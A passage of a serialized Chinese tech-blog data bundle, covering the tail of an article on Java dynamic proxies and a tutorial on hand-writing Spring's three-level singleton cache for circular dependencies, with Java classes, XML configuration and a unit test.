次生成的动态代理类，值得注意的一点是，并不是每次调用 proxy 的静态方法创建动态代理类都会使得 n 值增加，原因是如果对同一组接口（包括接口排列的顺序相同）试图重复创建动态代理类，它会很聪明地返回先前已经创建好的代理类的类对象，而不会再尝试去创建一个全新的代理类，这样可以节省不必要的代码重复生成，提高了代理类的创建效率。\n\n4）类继承关系：该类的继承关系如图：\n\n\n\n由图可见，proxy 类是它的父类，这个规则适用于所有由 proxy 创建的动态代理类。而且该类还实现了其所代理的一组接口，这就是为什么它能够被安全地类型转换到其所代理的某接口的根本原因。\n\n接下来让我们了解一下代理类实例的一些特点。每个实例都会关联一个调用处理器对象，可以通过 proxy 提供的静态方法 getinvocationhandler 去获得代理类实例的调用处理器对象。在代理类实例上调用其代理的接口中所声明的方法时，这些方法最终都会由调用处理器的 invoke 方法执行。\n\n此外，值得注意的是，代理类的根类 java.lang.object 中有三个方法也同样会被分派到调用处理器的 invoke 方法执行，它们是 hashcode，equals 和 tostring，可能的原因有：一是因为这些方法为 public 且非 final 类型，能够被代理类覆盖；二是因为这些方法往往呈现出一个类的某种特征属性，具有一定的区分度，所以为了保证代理类与委托类对外的一致性，这三个方法也应该被分派到委托类执行。当代理的一组接口有重复声明的方法且该方法被调用时，代理类总是从排在最前面的接口中获取方法对象并分派给调用处理器，而无论代理类实例是否正在以该接口（或继承于该接口的某子接口）的形式被外部引用，因为在代理类内部无法区分其当前的被引用类型。\n\n接着来了解一下被代理的一组接口有哪些特点。首先，要注意不能有重复的接口，以避免动态代理类代码生成时的编译错误。其次，这些接口对于类装载器必须可见，否则类装载器将无法链接它们，将会导致类定义失败。再次，需被代理的所有非 public 的接口必须在同一个包中，否则代理类生成也会失败。最后，接口的数目不能超过 65535，这是 jvm 设定的限制。\n\n最后再来了解一下异常处理方面的特点。从调用处理器接口声明的方法中可以看到理论上它能够抛出任何类型的异常，因为所有的异常都继承于 throwable 接口，但事实是否如此呢？\n\n答案是否定的，原因是我们必须遵守一个继承原则：即子类覆盖父类或实现父接口的方法时，抛出的异常必须在原方法支持的异常列表之内。所以虽然调用处理器理论上讲能够，但实际上往往受限制，除非父接口中的方法支持抛 throwable 异常。那么如果在 invoke 方法中的确产生了接口方法声明中不支持的异常，那将如何呢？\n\n放心，java 动态代理类已经为我们设计好了解决方法：它将会抛出 undeclaredthrowableexception 异常。这个异常是一个 runtimeexception 类型，所以不会引起编译错误。通过该异常的 getcause 方法，还可以获得原来那个不受支持的异常对象，以便于错误诊断。\n\n\n# 5、动态代理的优点和美中不足\n\n优点：\n\n动态代理与静态代理相比较，最大的好处是接口中声明的所有方法都被转移到调用处理器一个集中的方法中处理（invocationhandler.invoke）。这样，在接口方法数量比较多的时候，我们可以进行灵活处理，而不需要像静态代理那样每一个方法进行中转。在本示例中看不出来，因为invoke方法体内嵌入了具体的外围业务（记录任务处理前后时间并计算时间差），实际中可以类似spring aop那样配置外围业务。\n\n美中不足：\n\n诚然，proxy 已经设计得非常优美，但是还是有一点点小小的遗憾之处，那就是它始终无法摆脱仅支持 interface 代理的桎梏，因为它的设计注定了这个遗憾。回想一下那些动态生成的代理类的继承关系图，它们已经注定有一个共同的父类叫 proxy。java 的继承机制注定了这些动态代理类们无法实现对 class 的动态代理，原因是多继承在 java 中本质上就行不通。\n\n有很多条理由，人们可以否定对 class 代理的必要性，但是同样有一些理由，相信支持 class 动态代理会更美好。接口和类的划分，本就不是很明显，只是到了 java 中才变得如此的细化。如果只从方法的声明及是否被定义来考量，有一种两者的混合体，它的名字叫抽象类。实现对抽象类的动态代理，相信也有其内在的价值。此外，还有一些历史遗留的类，它们将因为没有实现任何接口而从此与动态代理永世无缘。如此种种，不得不说是一个小小的遗憾。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 14 - 循环引用及三级缓存",frontmatter:{title:"手写 Spring 14 - 循环引用及三级缓存",date:"2024-05-31T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-14.html",relativePath:"views/backend/spring-source-14.md",key:"v-6dbd705e",path:"/views/backend/spring-source-14.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:3},{level:2,title:"三级缓存及循环引用",slug:"三级缓存及循环引用",normalizedTitle:"三级缓存及循环引用",charIndex:9},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力",charIndex:24},{level:3,title:"具体的实现",slug:"具体的实现",normalizedTitle:"具体的实现",charIndex:39},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中",charIndex:50},{level:3,title:"测试",slug:"测试",normalizedTitle:"测试",charIndex:67},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:73}],excerpt:"<Boxx/>\n",headersStr:"解析 三级缓存及循环引用 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 总结",content:' * 解析\n * 三级缓存及循环引用\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n在 getBean 创建过程中，最重要的大三步为：实例化、属性填充、初始化。\n\n从流程可以看到，循环依赖主要发生在第二步（populateBean），也就是field属性注入的处理。\n\n\n# 三级缓存及循环引用\n\nprivate final Map<String, Object> singletonObjects = new ConcurrentHashMap<>(256); //一级缓存\nprivate final Map<String, Object> earlySingletonObjects = new HashMap<>(16); // 二级缓存\nprivate final Map<String, ObjectFactory<?>> singletonFactories = new HashMap<>(16); // 三级缓存\n\n\n1\n2\n3\n\n\n处理循环引用的关键点：\n\n * 循环依赖的核心功能实现主要包括 DefaultSingletonBeanRegistry 提供三级缓存：singletonObjects 、 earlySingletonObjects 、singletonFactories ，分别存放成品对象、半成品对象和工厂对象。同时包装三个缓存提供方法：getSingleton、registerSingleton、addSingletonFactory，这样使用方就可以分别在不同时间段存放和获取对应的对象了。\n * 在 AbstractAutowireCapableBeanFactory 的 doCreateBean 方法中，提供了关于提前暴露对象的操作， addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition,finalBean));，以及后续获取对象和注册对象的操作， exposedObject = getSingleton(beanName); 、 registerSingleton(beanName, exposedObject);，经过这样的处理就可以完成对复杂场景循环依赖的操作。\n * 另外在 DefaultAdvisorAutoProxyCreator 提供的切面服务中，也需要实现接口 InstantiationAwareBeanPostProcessor 新增的 getEarlyBeanReference 方法，便于把依赖的切面对象也能存放到三级缓存中，处理对应的循环依赖。\n\n\n# 定义一些职责和能力\n\n 1. ObjectFactory 提前暴露的三级缓存工厂对象，在运行时动态地获取对象的实例。\n\n 2. DefaultSingletonBeanRegistry 在原先一级缓存的基础上，添加二级和三级缓存，及相应的add方法，同时改造缓存获取 bean 逻辑为优先一其次二最后三中查找。\n\n 3. InstantiationAwareBeanPostProcessor 接口添加 getEarlyBeanReference 方法。\n    \n    public interface InstantiationAwareBeanPostProcessor extends BeanPostProcessor {\n        /**\n         * 在 Bean 实例化之后初始化之前，获取 Bean 的早期引用并进行操作。\n         * 若不需要执行AOP的逻辑，直接返回Bean。\n         *\n         * @param bean     bean\n         * @param beanName bean 名称\n         * @return {@link Object}\n         */\n        default Object getEarlyBeanReference(Object bean, String beanName) {\n            return bean;\n        } \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n    \n    主要用于将 aop 对象也提前暴露到三级缓存中。在 DefaultAdvisorAutoProxyCreator 实现它返回 aop 代理对象。\n\n\n# 具体的实现\n\n 1. ObjectFactory\n\npublic interface ObjectFactory<T> {\n\n    /**\n     * 这个方法返回一个类型为 T 的对象实例，您可以通过调用 getObject 方法来获取。\n     * ObjectFactory 通常用于将对象的创建和初始化推迟到需要的时候，以避免在应用程序启动时立即创建所有对象。\n     * <p>\n     * 在 Spring 中，ObjectFactory 的一个常见用法是在解决循环依赖问题时。\n     * 当 Spring 需要创建一个 Bean，但该 Bean 正在创建中，因此还不能完全初始化时，它会将该 Bean 的 ObjectFactory 放入二级缓存（earlySingletonObjects）中，\n     * 以便其他 Bean 可以提前获取 Bean 的引用，而不会导致循环依赖问题。\n     * <p>\n     * 另一个常见的用例是在配置中声明原型（prototype）作用域的 Bean，因为原型作用域的 Bean 不会在容器初始化时立即创建，而是在每次请求时动态创建。\n     * 在这种情况下，ObjectFactory 可以用于获取原型作用域 Bean 的实例。\n     *\n     * @return {@link T}\n     */\n    T getObject();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. DefaultSingletonBeanRegistry\n\n/**\n * 保存了所有单例 bean 和待销毁的 bean\n *\n * @author zhangpengjun\n * @date 2023/3/15\n */\npublic class DefaultSingletonBeanRegistry implements SingletonBeanRegistry {\n\n    /**\n     * 空单例对象的内部标记，用作 ConcurrentHashMap（不支持null值）的标记值。\n     */\n    protected static final Object NULL_OBJECT = new Object();\n\n    /**\n     * 一级缓存，一级缓存存储已经完全创建和初始化的单例 Bean 的实例。\n     */\n    private final Map<String, Object> singletonObjects = new ConcurrentHashMap<>(256);\n\n    /**\n     * 二级缓存，用于存储正在创建中的 Bean 的实例（属性尚未填填充）。\n     * 当 Spring 创建 Bean 时，如果发现该 Bean 存在循环依赖，它会将 Bean 的实例放入这个缓存中。这个实例可以被其他 Bean 提前获取，以解决循环依赖问题。\n     */\n    private final Map<String, Object> earlySingletonObjects = new HashMap<>(16);\n\n    /**\n     * 三级缓存，存储的是 Bean 的工厂对象（ObjectFactory）。\n     * 当 Spring 创建 Bean 时，如果发现该 Bean 存在循环依赖，它会将 Bean 的工厂对象放入这个缓存中。这个工厂对象用于在后续创建 Bean 的过程中获取 Bean 的实例。\n     */\n    private final Map<String, ObjectFactory<?>> singletonFactories = new HashMap<>(16);\n\n    private final Map<String, DisposableBean> disposableBeans = new HashMap<>();\n\n    @Override\n    public Object getSingleton(String beanName) {\n        // 先从一级缓存获取\n        Object singletonObject = singletonObjects.get(beanName);\n        if (singletonObject == null) {\n            // 再从二级缓存获取\n            singletonObject = earlySingletonObjects.get(beanName);\n            if (singletonObject == null) {\n                // 最后从三级缓存获取\n                ObjectFactory<?> singletonFactory = singletonFactories.get(beanName);\n                if (singletonFactory != null) {\n                    singletonObject = singletonFactory.getObject();\n                    // 三级缓存存在，放入二级缓存\n                    earlySingletonObjects.put(beanName, singletonObject);\n                    singletonFactories.remove(beanName);\n                }\n            }\n        }\n        return singletonObject;\n    }\n\n    @Override\n    public void registerSingleton(String beanName, Object singletonObject) {\n        singletonObjects.put(beanName, singletonObject);\n        earlySingletonObjects.remove(beanName);\n        singletonFactories.remove(beanName);\n    }\n\n    protected void addSingletonFactory(String beanName, ObjectFactory<?> objectFactory) {\n        if (!singletonFactories.containsKey(beanName)) {\n            singletonFactories.put(beanName, objectFactory);\n            earlySingletonObjects.remove(beanName);\n        }\n    }\n\n    @Override\n    public void registerDisposableBean(String beanName, DisposableBean bean) {\n        disposableBeans.put(beanName, bean);\n    }\n\n    @Override\n    public void destroySingletons() {\n        Set<String> keySet = disposableBeans.keySet();\n        Object[] disposableBeanNames = keySet.toArray();\n        for (int i = disposableBeanNames.length - 1; i >= 0; i--) {\n            Object beanName = disposableBeanNames[i];\n            DisposableBean disposableBean = disposableBeans.remove(beanName);\n            try {\n                disposableBean.destroy();\n            } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException e) {\n                throw new BeansException("Failed to bean:[" + beanName + "] destroy", e);\n            }\n        }\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n\n 3. DefaultAdvisorAutoProxyCreator\n\n\n * DefaultAdvisorAutoProxyCreator 是 Spring Framework 中的一个类，负责根据配置的 Advisors 自动为 Bean 创建代理。\n * 它会扫描 bean，查找任何配置的 Advisors，并在必要时为这些 bean 创建动态代理。\n * 在 Spring Framework 中，Advisors 是定义 advice 的对象，例如拦截方法调用额外的行为。\n * <br/>\n * 它的工作原理如下：\n * <br/>\n * 1. DefaultAdvisorAutoProxyCreator 在初始化阶段检查应用上下文中的所有 bean。\n * 2. 它查找配置了 Advisors 的 bean。一个 Advisor 通常由切面逻辑（advice）和切入点（pointcut）组成，切入点用于指定 advice 应该应用的位置。\n * 3. 对于每个配置了 Advisors 的 bean，DefaultAdvisorAutoProxyCreator 创建一个代理对象，该代理对象包装了原始的 bean。\n * 4. 代理对象拦截对 bean 的方法调用，并应用配置的 Advisors 定义的 advice。\n * 5. 当应用上下文中的其他 bean 请求原始 bean 时，它们将接收代理对象而不是原始对象。\n *\n * @author zhangpengjun\n * @date 2023/4/19\n */\npublic class DefaultAdvisorAutoProxyCreator implements InstantiationAwareBeanPostProcessor, BeanFactoryAware {\n\n    private DefaultListableBeanFactory beanFactory;\n\n    private final Set<String> earlyProxyReferences = Collections.synchronizedSet(new HashSet<>());\n\n    @Override\n    public void setBeanFactory(BeanFactory beanFactory) {\n        this.beanFactory = (DefaultListableBeanFactory) beanFactory;\n    }\n\n    @Override\n    public PropertyValues postProcessPropertyValues(PropertyValues pvs, Object bean, String beanName) {\n        return pvs;\n    }\n\n    @Override\n    public Object postProcessBeforeInstantiation(Class<?> beanClass, String beanName) throws BeansException {\n        return null;\n    }\n\n    @Override\n    public boolean postProcessAfterInstantiation(Object bean, String beanName) {\n        return true;\n    }\n\n    private boolean isInfrastructureClass(Class<?> beanClass) {\n        return Advice.class.isAssignableFrom(beanClass) || Pointcut.class.isAssignableFrom(beanClass) || Advisor.class.isAssignableFrom(beanClass);\n    }\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) {\n        return bean;\n    }\n\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) {\n        if (!earlyProxyReferences.contains(beanName)) {\n            return wrapIfNecessary(bean, beanName);\n        }\n        return wrapIfNecessary(bean, beanName);\n    }\n\n    private Object wrapIfNecessary(Object bean, String beanName) {\n        if (isInfrastructureClass(bean.getClass())) {\n            return bean;\n        }\n\n        Collection<AspectJExpressionPointcutAdvisor> advisors = beanFactory.getBeansOfType(AspectJExpressionPointcutAdvisor.class).values();\n        for (AspectJExpressionPointcutAdvisor advisor : advisors) {\n            // 不匹配当前类，过滤\n            ClassFilter classFilter = advisor.getPointcut().getClassFilter();\n            if (classFilter != null && !classFilter.matches(bean.getClass())) {\n                continue;\n            }\n            // 转换为代理对象返回\n            AdvisedSupport advisedSupport = new AdvisedSupport();\n            advisedSupport.setTargetSource(new TargetSource(bean));\n            advisedSupport.setMethodMatcher(advisor.getPointcut().getMethodMatcher());\n            advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice());\n            advisedSupport.setProxyTargetClass(false); // 默认使用 jdk 代理\n            return new ProxyFactory(advisedSupport).getProxy();\n        }\n\n        return bean;\n    }\n\n    @Override\n    public Object getEarlyBeanReference(Object bean, String beanName) {\n        earlyProxyReferences.add(beanName);\n        return wrapIfNecessary(bean, beanName);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n\n\n\n# 将实现加入原有的逻辑中\n\n * 修改 AbstractAutowireCapableBeanFactory#createBean，在实例化之后，填充属性之前，”提前暴露“原始对象的引用（放入三级缓存），用于解决循环依赖。\n\n@Override\n    protected Object createBean(String beanName, BeanDefinition beanDefinition, Object[] args) throws BeansException {\n        Object bean = null;\n        try {\n            // 判断是否返回 代理 Bean 对象（注释原因，改用 BeanPostProcessor#postProcessAfterInitialization() 实现）\n            // bean = resolveBeforeInstantiation(beanName, beanDefinition);\n            // if (bean != null) {\n            //     return bean;\n            // }\n            // 实例化\n            bean = createBeanInstance(beanName, beanDefinition, args);\n\n            // 处理循环依赖，将实例化后的 bean 提前放入缓存中暴露出来\n            if (beanDefinition.isSingleton()) {\n                Object finalBean = bean;\n                // ”提前暴露“原始对象的引用，用于解决循环依赖\n                addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition, finalBean));\n            }\n            // 实例化后判断，对于不需要填充属性的 bean 直接返回\n            boolean continueWithPropertyPopulation = applyBeanPostProcessorsAfterInstantiation(beanName, bean);\n            if (!continueWithPropertyPopulation) {\n                return bean;\n            }\n\n            // 在设置 Bean 属性之前，允许 BeanPostProcessor 修改属性值（解析@Value @Autowired等）\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // 属性填充\n            applyPropertyValues(beanName, bean, beanDefinition);\n\n            // 添加 Bean 的初始化扩展\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Failed to bean:[" + beanName + "] instance", e);\n        }\n\n        // 添加单例 Bean 缓存\n        if (beanDefinition.isSingleton()) {\n            // 注册实现了 DisposableBean 接口的 单例Bean 对象，留待容器停止的时候调用。\n            registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n            registerSingleton(beanName, bean);\n        }\n        return bean;\n    }\n\n    private Object getEarlyBeanReference(String beanName, BeanDefinition beanDefinition, Object bean) {\n        Object exposedObject = bean;\n        for (BeanPostProcessor beanPostProcessor : getBeanPostProcessors()) {\n            if (beanPostProcessor instanceof InstantiationAwareBeanPostProcessor) {\n                exposedObject = ((InstantiationAwareBeanPostProcessor) beanPostProcessor).getEarlyBeanReference(exposedObject, beanName);\n                if (exposedObject == null) {\n                    return exposedObject;\n                }\n            }\n        }\n        return exposedObject;\n    }\n\n    private boolean applyBeanPostProcessorsAfterInstantiation(String beanName, Object bean) {\n        boolean continueWithPropertyPopulation = true;\n        for (BeanPostProcessor beanPostProcessor : getBeanPostProcessors()) {\n            if (beanPostProcessor instanceof InstantiationAwareBeanPostProcessor) {\n                InstantiationAwareBeanPostProcessor instantiationAwareBeanPostProcessor = (InstantiationAwareBeanPostProcessor) beanPostProcessor;\n                if (!instantiationAwareBeanPostProcessor.postProcessAfterInstantiation(bean, beanName)) {\n                    continueWithPropertyPopulation = false;\n                    break;\n                }\n            }\n        }\n        return continueWithPropertyPopulation;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n\n# 测试\n\n * xml 准备，spring-cyclic-dependence.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    \x3c!--  目标类  --\x3e\n    <bean class="com.snail.springframework.cyclicDependence.A">\n        <property name="b" ref="b"></property>\n    </bean>\n    <bean class="com.snail.springframework.cyclicDependence.B">\n        <property name="a" ref="a"></property>\n        <property name="c" ref="cFace"></property>\n    </bean>\n    <bean id="cFace" class="com.snail.springframework.cyclicDependence.CFace"></bean>\n\n    \x3c!--  aop  --\x3e\n    <bean class="com.snail.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"/>\n\n    \x3c!--  切面逻辑  --\x3e\n    <bean id="bAdvice" class="com.snail.springframework.cyclicDependence.BAdvice"></bean>\n    <bean id="methodInterceptor" class="com.snail.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor">\n        <property name="methodBeforeAdvice" ref="bAdvice"/>\n    </bean>\n\n    \x3c!--  切入点  --\x3e\n    <bean class="com.snail.springframework.aop.aspectj.AspectJExpressionPointcutAdvisor">\n        <property name="advice" ref="methodInterceptor"></property>\n        \x3c!--   cglib 代理     --\x3e\n        <property name="expression" value="execution(* com.snail.springframework.cyclicDependence.IFace.*(..))"></property>\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n * 提前准备，A（循环引用类）、B（循环引用类）、BAdvice（B切面）、IFace接口、CFace（接口实现类）\n\npublic class A {\n\n    private B b;\n\n    public String print() {\n        return "A print b: " + b;\n    }\n\n}\npublic class B {\n\n    private A a;\n    private IFace c;\n\n    public String print() {\n        return "B print a: " + a + "\\n\\t\\tB print Face c: " + c.getFace();\n    }\n\n}\npublic class BAdvice implements MethodBeforeAdvice {\n\n    @Override\n    public void before(Method method, Object[] args, Object target) throws Throwable {\n        System.out.println("BAdvice before method: " + method);\n    }\n\n}\npublic interface IFace {\n\n    String getFace();\n\n}\npublic class CFace implements FactoryBean<IFace> {\n\n    @Override\n    public IFace getObject() {\n        return (IFace) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{IFace.class}, ((proxy, method, args) ->\n                "proxy face method name: " + method.getName()\n        ));\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return IFace.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n * 测试类\n\npublic class SpringCyclicDependenceTest {\n\n    /**\n     * 测试三级缓存循环引用\n     */\n    @Test\n    public void test_cyclic_dependence() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring-cyclic-dependence.xml");\n        A a = applicationContext.getBean(A.class);\n        System.out.println("测试结果：" + a.print());\n        B b = applicationContext.getBean(B.class);\n        System.out.println("测试结果：" + b.print());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试结果\n\n测试结果：A print b: com.snail.springframework.cyclicDependence.B$$EnhancerByCGLIB$$d03a45b9@37374a5e\n测试结果：B print a: com.snail.springframework.cyclicDependence.A$$EnhancerByCGLIB$$c473690e@4671e53b\n\t\tB print Face c: proxy face method name: getFace\n\n\n1\n2\n3\n\n\n\n# 总结\n\n以上面A、B类使用属性field注入循环依赖的例子为例，对整个流程做文字步骤总结如下：\n\n 1.  使用context.getBean(A.class)，旨在获取容器内的单例A(若A不存在，就会走A这个Bean的创建流程)，显然初次获取A是不存在的，因此走A的创建之路~\n 2.  实例化A（注意此处仅仅是实例化），并将它放进缓存（此时A已经实例化完成，已经可以被引用了）\n 3.  初始化A：@Autowired依赖注入B（此时需要去容器内获取B）\n 4.  为了完成依赖注入B，会通过getBean(B)去容器内找B。但此时B在容器内不存在，就走向B的创建之路~\n 5.  实例化B，并将其放入缓存。（此时B也能够被引用了）\n 6.  初始化B，@Autowired依赖注入A（此时需要去容器内获取A）\n 7.  此处重要：初始化B时会调用getBean(A)去容器内找到A，上面我们已经说过了此时候因为A已经实例化完成了并且放进了缓存里，所以这个时候去看缓存里是已经存在A的引用了的，所以getBean(A)能够正常返回\n 8.  B初始化成功（此时已经注入A成功了，已成功持有A的引用了），return（注意此处return相当于是返回最上面的getBean(B)这句代码，回到了初始化A的流程中~）。\n 9.  因为B实例已经成功返回了，因此最终A也初始化成功\n 10. 到此，B持有的已经是初始化完成的A，A持有的也是初始化完成的B，完美~',normalizedContent:' * 解析\n * 三级缓存及循环引用\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n在 getbean 创建过程中，最重要的大三步为：实例化、属性填充、初始化。\n\n从流程可以看到，循环依赖主要发生在第二步（populatebean），也就是field属性注入的处理。\n\n\n# 三级缓存及循环引用\n\nprivate final map<string, object> singletonobjects = new concurrenthashmap<>(256); //一级缓存\nprivate final map<string, object> earlysingletonobjects = new hashmap<>(16); // 二级缓存\nprivate final map<string, objectfactory<?>> singletonfactories = new hashmap<>(16); // 三级缓存\n\n\n1\n2\n3\n\n\n处理循环引用的关键点：\n\n * 循环依赖的核心功能实现主要包括 defaultsingletonbeanregistry 提供三级缓存：singletonobjects 、 earlysingletonobjects 、singletonfactories ，分别存放成品对象、半成品对象和工厂对象。同时包装三个缓存提供方法：getsingleton、registersingleton、addsingletonfactory，这样使用方就可以分别在不同时间段存放和获取对应的对象了。\n * 在 abstractautowirecapablebeanfactory 的 docreatebean 方法中，提供了关于提前暴露对象的操作， addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition,finalbean));，以及后续获取对象和注册对象的操作， exposedobject = getsingleton(beanname); 、 registersingleton(beanname, exposedobject);，经过这样的处理就可以完成对复杂场景循环依赖的操作。\n * 另外在 defaultadvisorautoproxycreator 提供的切面服务中，也需要实现接口 instantiationawarebeanpostprocessor 新增的 getearlybeanreference 方法，便于把依赖的切面对象也能存放到三级缓存中，处理对应的循环依赖。\n\n\n# 定义一些职责和能力\n\n 1. objectfactory 提前暴露的三级缓存工厂对象，在运行时动态地获取对象的实例。\n\n 2. defaultsingletonbeanregistry 在原先一级缓存的基础上，添加二级和三级缓存，及相应的add方法，同时改造缓存获取 bean 逻辑为优先一其次二最后三中查找。\n\n 3. instantiationawarebeanpostprocessor 接口添加 getearlybeanreference 方法。\n    \n    public interface instantiationawarebeanpostprocessor extends beanpostprocessor {\n        /**\n         * 在 bean 实例化之后初始化之前，获取 bean 的早期引用并进行操作。\n         * 若不需要执行aop的逻辑，直接返回bean。\n         *\n         * @param bean     bean\n         * @param beanname bean 名称\n         * @return {@link object}\n         */\n        default object getearlybeanreference(object bean, string beanname) {\n            return bean;\n        } \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n    \n    主要用于将 aop 对象也提前暴露到三级缓存中。在 defaultadvisorautoproxycreator 实现它返回 aop 代理对象。\n\n\n# 具体的实现\n\n 1. objectfactory\n\npublic interface objectfactory<t> {\n\n    /**\n     * 这个方法返回一个类型为 t 的对象实例，您可以通过调用 getobject 方法来获取。\n     * objectfactory 通常用于将对象的创建和初始化推迟到需要的时候，以避免在应用程序启动时立即创建所有对象。\n     * <p>\n     * 在 spring 中，objectfactory 的一个常见用法是在解决循环依赖问题时。\n     * 当 spring 需要创建一个 bean，但该 bean 正在创建中，因此还不能完全初始化时，它会将该 bean 的 objectfactory 放入二级缓存（earlysingletonobjects）中，\n     * 以便其他 bean 可以提前获取 bean 的引用，而不会导致循环依赖问题。\n     * <p>\n     * 另一个常见的用例是在配置中声明原型（prototype）作用域的 bean，因为原型作用域的 bean 不会在容器初始化时立即创建，而是在每次请求时动态创建。\n     * 在这种情况下，objectfactory 可以用于获取原型作用域 bean 的实例。\n     *\n     * @return {@link t}\n     */\n    t getobject();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. defaultsingletonbeanregistry\n\n/**\n * 保存了所有单例 bean 和待销毁的 bean\n *\n * @author zhangpengjun\n * @date 2023/3/15\n */\npublic class defaultsingletonbeanregistry implements singletonbeanregistry {\n\n    /**\n     * 空单例对象的内部标记，用作 concurrenthashmap（不支持null值）的标记值。\n     */\n    protected static final object null_object = new object();\n\n    /**\n     * 一级缓存，一级缓存存储已经完全创建和初始化的单例 bean 的实例。\n     */\n    private final map<string, object> singletonobjects = new concurrenthashmap<>(256);\n\n    /**\n     * 二级缓存，用于存储正在创建中的 bean 的实例（属性尚未填填充）。\n     * 当 spring 创建 bean 时，如果发现该 bean 存在循环依赖，它会将 bean 的实例放入这个缓存中。这个实例可以被其他 bean 提前获取，以解决循环依赖问题。\n     */\n    private final map<string, object> earlysingletonobjects = new hashmap<>(16);\n\n    /**\n     * 三级缓存，存储的是 bean 的工厂对象（objectfactory）。\n     * 当 spring 创建 bean 时，如果发现该 bean 存在循环依赖，它会将 bean 的工厂对象放入这个缓存中。这个工厂对象用于在后续创建 bean 的过程中获取 bean 的实例。\n     */\n    private final map<string, objectfactory<?>> singletonfactories = new hashmap<>(16);\n\n    private final map<string, disposablebean> disposablebeans = new hashmap<>();\n\n    @override\n    public object getsingleton(string beanname) {\n        // 先从一级缓存获取\n        object singletonobject = singletonobjects.get(beanname);\n        if (singletonobject == null) {\n            // 再从二级缓存获取\n            singletonobject = earlysingletonobjects.get(beanname);\n            if (singletonobject == null) {\n                // 最后从三级缓存获取\n                objectfactory<?> singletonfactory = singletonfactories.get(beanname);\n                if (singletonfactory != null) {\n                    singletonobject = singletonfactory.getobject();\n                    // 三级缓存存在，放入二级缓存\n                    earlysingletonobjects.put(beanname, singletonobject);\n                    singletonfactories.remove(beanname);\n                }\n            }\n        }\n        return singletonobject;\n    